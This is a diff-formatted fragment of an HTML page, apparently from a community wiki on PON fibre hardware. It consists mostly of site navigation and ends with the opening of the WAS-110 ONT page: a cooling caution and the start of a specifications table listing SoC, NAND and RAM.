+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/sonic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sonic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/technicolor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Technicolor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/telus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Telus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/vantiva/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vantiva
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/vincent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vincent
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/virgin-media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virgin Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/virgin-plus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virgin Plus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/was-110/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WAS-110
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/x-onu-sfpp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    X-ONU-SFPP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/xg-99m/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XG-99M
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/xg-99rg2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XG-99RG2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/xgs-pon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XGS-PON
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/xs-010x-q/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XS-010X-Q
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/xs-2426g-a/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XS-2426G-A
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/xs-250x-a/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XS-250X-A
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../gpon/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GPON
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    GPON
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ONT
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ONT
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Source Photonics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Source Photonics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../gpon/ont/source-photonics/sps-34-24t-hp-tdfo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SPS-34-24T-HP-TDFO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XGS-PON
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    XGS-PON
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ONT
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ONT
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BFW Solutions
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    BFW Solutions
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WAS-110
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WAS-110
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#specifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Specifications
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#maxlinear-prx126" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MaxLinear PRX126
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#system-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Information
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="System Information">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#boot-log" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Boot log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#procfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        procfs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mtds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MTDs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MTDs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#switch-banks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Switch banks
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#eeprom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EEPROM
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="EEPROM">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#read" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Read
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Read">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a0-0x50" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A0 (0x50)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a2-0x51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A2 (0x51)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#write" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Write
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Write">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#physical-eeprom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Physical EEPROM
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#default-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Default Credentials
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Default Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#value-added-resellers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Value-Added Resellers
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Calix
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Calix
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../calix/100-05610/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    100-05610
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3" id="__nav_3_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nokia
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Nokia
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../nokia/xs-010x-q/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XS-010X-Q
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_4" id="__nav_3_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Potron Technology
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Potron Technology
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../potron-technology/x-onu-sfpp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    X-ONU-SFPP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../discord/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DISCORD
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DISCORD
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../discord/history/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    History
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../discord/quick-start/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quick start
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../discord/group-buys/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Group buys
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../discord/giveaways/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Giveaways
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../discord/stickers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Stickers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../on-the-web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ON THE WEB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#specifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Specifications
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#maxlinear-prx126" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MaxLinear PRX126
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#system-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Information
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="System Information">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#boot-log" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Boot log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#procfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        procfs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mtds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MTDs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MTDs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#switch-banks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Switch banks
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#eeprom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EEPROM
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="EEPROM">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#read" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Read
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Read">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a0-0x50" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A0 (0x50)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a2-0x51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A2 (0x51)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#write" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Write
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Write">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#physical-eeprom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Physical EEPROM
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#default-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Default Credentials
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Default Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#web-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#value-added-resellers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Value-Added Resellers
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    XGS-PON
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    ONT
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    BFW Solutions
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="was-110">WAS-110 <sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup><a class="headerlink" href="#was-110" title="Permanent link">&para;</a></h1>
+<p><a class="glightbox" href="was-110.webp" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="WAS-110" src="was-110.webp" /></a></p>
+<div class="admonition warning">
+<p class="admonition-title">Caution: Hot surface</p>
+<p>It is advisable to provide sufficient cooling. Although temperatures in excess of 60&deg;C are within specification,
+over time they may decrease the product lifespan.</p>
+<p>The 8311 community has produced many active cooling designs to improve overall temperatures.
+Join the <a href="https://discord.pon.wiki" rel="noopener" target="_blank">Discord</a> for additional tips.</p>
+</div>
+<h2 id="specifications">Specifications<a class="headerlink" href="#specifications" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: right;"></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: right;"><strong><abbr title="System on a Chip">SoC</abbr></strong></td>
+<td>PRX126 @ 400 MHz - MIPS interAptiv 34Kc</td>
+<td><a href="#architecture">Architecture</a> <sup id="fnref:10"><a class="footnote-ref" href="#fn:10">8</a></sup></td>
+</tr>
+<tr>
+<td style="text-align: right;"><strong>NAND</strong></td>
+<td>128 MB <em>(1 Gbit)</em></td>
+<td><a href="https://www.winbond.com/hq/product/code-storage-flash-memory/qspinand-flash/?__locale=en&amp;partNo=W25N01GV" rel="noopener" target="_blank">WN25N01GW</a></td>
+</tr>
+<tr>
+<td style="text-align: right;"><strong><abbr title="Random Access Memory">RAM</abbr></strong></td>
+<td>1 GB</td>
+<td><a href="https://www.nanya.com/en/Product/4324/NT6CL256M32AM-H0" rel="noopener" target="_blank">NT6CL256M32AM</a></td>
+</tr>
+<tr>
